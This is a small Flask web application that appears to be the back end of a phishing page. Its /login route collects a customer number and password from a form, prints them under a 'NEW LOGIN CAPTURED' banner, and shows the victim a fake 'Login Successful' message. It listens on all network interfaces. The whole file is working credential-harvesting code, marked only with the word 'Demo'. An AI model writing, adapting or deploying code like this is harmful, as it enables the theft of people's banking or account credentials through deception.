from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    cust_num = request.form.get('customer_number')
    password = request.form.get('password')
    print("\n==============================")
    print("      NEW LOGIN CAPTURED      ")
    print("==============================")
    print(f"Customer Number : {cust_num}")
    print(f"Password        : {password}")
    print("------------------------------\n")
    return "Login Successful! (Demo)"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)